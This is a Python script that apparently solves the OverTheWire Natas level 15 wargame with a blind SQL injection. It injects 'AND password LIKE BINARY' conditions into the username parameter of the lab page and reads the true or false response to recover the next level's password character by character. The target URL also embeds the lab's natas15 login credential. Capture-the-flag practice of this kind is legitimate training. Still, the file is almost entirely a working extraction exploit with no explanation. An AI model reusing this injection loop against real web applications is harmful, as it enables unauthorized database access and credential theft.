import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
exist = ''
password = ''
target = 'http://natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB@natas15.natas.labs.overthewire.org/index.php'
trueStr = 'This user exists.'

r = requests.get(target, verify=False)

for x in chars:
	r = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+x+'%" "')
	if r.content.find(trueStr.encode('utf-8')) != -1:
		exist += x
		print ('Using: ' + exist)

print ('All characters used. Starting brute force... Grab a coffee, might take a while!')

for i in range(32):
	for c in exist:
		r = requests.get(target+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
		if r.content.find(trueStr.encode('utf-8')) != -1:
			password += c
			print ('Password: ' + password + '*' * int(32 - len(password)))
			break

print ('Completed!')